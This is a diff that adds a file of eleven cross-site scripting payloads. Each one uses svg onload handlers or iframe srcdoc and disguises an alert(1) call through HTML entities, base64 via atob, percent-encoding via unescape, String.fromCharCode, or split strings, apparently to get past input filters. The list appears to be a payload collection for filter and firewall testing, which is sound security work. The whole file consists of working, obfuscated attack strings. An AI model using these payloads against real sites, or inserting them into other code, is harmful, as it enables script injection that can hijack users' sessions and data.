@@ -1,0 +1,11 @@
+<svg onload="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+<iframe srcdoc="<svg onload=eval(atob('YWxlcnQoMSk='))></svg>"></iframe>
+<svg onload="window[&quot;al&quot;+&quot;ert&quot;](1)">
+<iframe srcdoc="<script>setTimeout('al'+String.fromCharCode(101,114,116)+'(1)',0)</script>"></iframe>
+<svg onload="setInterval('al'+String.fromCharCode(101,114,116)+'(1)',1000)">
+<iframe srcdoc="<svg onload=eval(unescape('%61%6c%65%72%74%28%31%29'))></svg>"></iframe>
+<iframe srcdoc="<script>window[&quot;al&quot;+&quot;ert&quot;](1)</script>"></iframe>
+<svg onload="window[unescape('%61%6c%65%72%74')](1)">
+<svg onload="setTimeout('window[&quot;al&quot;+&quot;ert&quot;](1)',0)">
+<iframe srcdoc="<script>eval(unescape('%61%6c%65%72%74%28%31%29'))</script>"></iframe>
+<iframe srcdoc="<svg onload=setInterval('window[&quot;al&quot;+&quot;ert&quot;](1)',1000)></svg>"></iframe>
